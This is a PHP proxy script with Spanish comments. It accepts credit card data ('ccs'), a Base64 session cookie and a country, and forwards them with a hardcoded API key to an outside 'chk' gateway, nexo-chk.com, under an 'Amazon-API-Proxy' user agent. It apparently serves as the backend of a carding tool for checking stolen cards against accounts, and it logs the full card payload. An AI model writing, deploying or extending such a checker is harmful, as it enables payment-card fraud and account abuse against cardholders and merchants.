<?php
// Establecer el tipo de contenido como JSON
header('Content-Type: application/json');

// Habilitar CORS si es necesario
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Solo permitir método POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Método no permitido. Solo POST.']);
    exit;
}

try {
    // Obtener y validar datos del POST
    $ccs = $_POST['ccs'] ?? '';
    $cookie = $_POST['cookie'] ?? '';
    $pais = $_POST['pais'] ?? '';
    
    // Validaciones básicas
    if (empty($ccs)) {
        throw new Exception('La tarjeta (CC) es requerida');
    }
    
    if (empty($cookie)) {
        throw new Exception('La cookie es requerida');
    }
    
    if (empty($pais)) {
        throw new Exception('El país es requerido');
    }
    
    // Validar que la cookie esté en formato Base64
    if (!base64_decode($cookie, true)) {
        throw new Exception('La cookie no está en formato Base64 válido');
    }
    
    // Preparar el payload para la API
    $payload = [
        'ccs' => $ccs,
        'cookie' => $cookie, // Ya viene en Base64 desde el frontend
        'pais' => $pais
    ];
    
    // Log para debug (opcional, comentar en producción)
    error_log('Enviando payload: ' . json_encode($payload));
    
    // Configurar cURL
    $ch = curl_init('https://nexo-chk.com/api_gateway.php');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'api_key: madrid'
    ]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Timeout de 30 segundos
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); // Timeout de conexión
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Verificar SSL
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Seguir redirects
    curl_setopt($ch, CURLOPT_USERAGENT, 'Amazon-API-Proxy/1.0');
    
    // Ejecutar la petición
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);
    
    // Verificar errores de cURL
    if ($response === false || !empty($curlError)) {
        throw new Exception('Error de conexión con la API: ' . $curlError);
    }
    
    // Verificar código de respuesta HTTP
    if ($httpCode >= 400) {
        throw new Exception("Error HTTP {$httpCode} de la API");
    }
    
    // Validar que la respuesta sea JSON válido
    $decodedResponse = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        // Si no es JSON válido, devolver la respuesta tal como viene
        echo $response;
    } else {
        // Si es JSON válido, añadir información adicional
        $decodedResponse['proxy_info'] = [
            'timestamp' => date('Y-m-d H:i:s'),
            'http_code' => $httpCode,
            'cookie_base64' => substr($cookie, 0, 50) . '...' // Solo mostrar primeros 50 caracteres por seguridad
        ];
        echo json_encode($decodedResponse, JSON_PRETTY_PRINT);
    }
    
} catch (Exception $e) {
    // Manejo de errores
    http_response_code(400);
    echo json_encode([
        'error' => true,
        'message' => $e->getMessage(),
        'timestamp' => date('Y-m-d H:i:s')
    ]);
    
    // Log del error
    error_log('Error en API Proxy: ' . $e->getMessage());
}
?>